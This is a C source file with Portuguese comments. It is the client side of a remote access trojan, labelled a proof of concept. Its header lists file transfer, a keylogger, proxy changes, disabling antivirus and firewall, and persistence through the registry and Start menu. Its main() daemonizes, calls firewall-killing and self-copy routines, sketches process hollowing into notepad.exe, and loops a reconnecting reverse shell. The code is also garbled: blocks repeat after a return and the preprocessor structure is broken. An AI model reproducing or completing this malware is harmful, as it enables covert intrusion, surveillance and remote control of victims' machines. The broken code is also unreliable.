/* Esse é o lado "cliente". Programa qúe será instalado na máquina alvo, com o servidor na monitoria.

Podendo mandar e receber arquivos, ativar keylogger, e mudar o proxy da máquina.

JÁ PRONTOS: desativar anti-virus e firewall
            copiar-se para o registro
            copiar-se para o menu iniciar

terraquian date: 10/05/2019 - 13:21 -PM *** in desenvolpment.

 use without abuse.

 POC!

 coder  mrx6s0

*/

#include "main.h"

int main()

{
    // 1. Torna-se um processo daemon para rodar em segundo plano.
    daemonize();
    #if defined(_WIN32) || defined(_WIN64)
        // No Windows, em vez de rodar diretamente, vamos nos injetar
        // em um processo legítimo para nos escondermos.
        
        // O caminho para um processo confiável do sistema.
        // É importante usar o caminho completo para evitar sequestro de DLL.
        char targetProcess[] = "C:\\Windows\\System32\\notepad.exe";
        
        // Obter o caminho do nosso próprio executável.
        char selfPath[MAX_PATH];
        GetModuleFileName(NULL, selfPath, MAX_PATH);

    // 2. Executa tarefas de instalação uma vez.
    kill_frwl();
    auto_copy();
        // A função mágica que realiza o Process Hollowing.
        // Ela iniciaria notepad.exe suspenso, injetaria o código de selfPath
        // e o retomaria.
        // InjectAndRun(targetProcess, selfPath);

    // 3. Entra no loop principal para manter a conexão reversa.
    while(1) {
        // A função shell agora tentará conectar e fornecer um shell.
        // Se a conexão cair, o loop fará com que ela tente se reconectar.
        shell();
        sleep(30); // Espera 30 segundos antes de tentar reconectar.
    }
        // Se a injeção for bem-sucedida, o processo original (silent_door.exe)
        // pode se encerrar, pois o backdoor agora está rodando dentro do notepad.exe.
        // A lógica abaixo NUNCA seria executada pelo processo original.
        // Ela só existe para ser injetada.
    #endif

    return 0; // Inalcançável, mas bom para completude.
    // =======================================================================
    // ESTE É O CÓDIGO QUE RODARÁ DENTRO DO PROCESSO HOSPEDEIRO (ex: notepad.exe)
    // =======================================================================

        // 1. Torna-se um processo daemon para rodar em segundo plano.
        daemonize();

        // 2. Executa tarefas de instalação uma vez.
        kill_frwl();
        auto_copy();

        // 3. Entra no loop principal para manter a conexão reversa.
        while(1) {
            // A função shell agora tentará conectar e fornecer um shell.
            // Se a conexão cair, o loop fará com que ela tente se reconectar.
            shell();
            sleep(30); // Espera 30 segundos antes de tentar reconectar.
        }

        return 0; // Inalcançável, mas bom para completude.
}







// End Main








// End Main
